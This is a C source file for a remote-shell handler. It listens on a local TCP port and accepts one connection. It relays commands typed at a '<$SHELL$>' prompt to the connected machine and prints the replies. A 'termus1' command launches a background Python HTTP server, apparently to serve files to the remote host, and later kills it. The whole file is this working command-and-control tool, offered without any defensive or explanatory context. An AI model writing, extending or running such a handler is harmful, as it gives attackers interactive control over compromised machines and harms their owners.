#include <stdio.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

#define RED     "\x1b[31m"
#define GREEN   "\x1b[32m"
#define YELLOW  "\x1b[33m"
#define BLUE    "\x1b[34m"
#define MAGENTA "\x1b[35m"
#define CYAN    "\x1b[36m"
#define RESET   "\x1b[0m"

#define BOLD_RED "\x1b[1m\033[31m"
#define BOLD_GREEN "\x1b[1m\033[32m"
#define BOLD_YELLOW "\x1b[1m\033[33m"
#define BOLD_BLUE "\x1b[1m\033[34m"
#define BOLD_MAGENTA "\x1b[1m\033[35m"
#define BOLD_CYAN "\x1b[1m\033[36m"
#define BOLD_WHITE "\x1b[1m\033[37m"

int main(){
    int sock,n_sock;
    int opval = 1;
    char data[1024];
    char buff[4096];
    char input[1024];
    struct sockaddr_in server;
    int serverlen = sizeof(server);

    if((sock = socket(AF_INET,SOCK_STREAM,0)) < 0){printf("%s[x] Error with socket creation%s\n",BOLD_RED,RESET);return 0;};

    if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR | SO_REUSEPORT,&opval,sizeof(opval))){printf("%s[x] Error with setting up multi-use socket%s\n",BOLD_RED,RESET);return 0;};

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(2323);

    if(bind(sock,(struct sockaddr*)&server,sizeof(server)) < 0){printf("[x] Error with binding socket\n",BOLD_RED,RESET);return 0;}

    printf("%s[!] Listening for connection%s\n",BOLD_YELLOW,RESET);
    if(listen(sock,3) < 0){printf("%s[x] Error while listening for connection%s\n",BOLD_RED,RESET);return 0;};

    n_sock = accept(sock,(struct sockaddr*)&server,(socklen_t*)&serverlen);
    printf("%s[+] Connected%s\n",BOLD_GREEN,RESET);
    while(1){
        printf("%s<$SHELL$>%s ",BOLD_MAGENTA,RESET);
        fgets(input,sizeof(input),stdin);
        if(strncmp(input,"termus1",7) == 0){
            FILE *term = popen("python3 -m http.server &","w");
            fclose(term);
        }
        else if(strncmp(input,"termus0",7) == 0){
            printf("%s\nExiting...%s\n",BOLD_RED,RESET);
            close(sock);
            return 0;
        }
        puts("");
        send(n_sock,input,sizeof(input),0);
        if(strncmp(input,"termus1",7) == 0){
            FILE *term = popen("pkill python","w");
            fclose(term);
        }
        memset(buff,0,sizeof(buff));
        recv(n_sock,buff,sizeof(buff),0);
        printf("%s%s%s\n",BOLD_WHITE,buff,RESET);
    }

    close(sock);
    return 0;
}
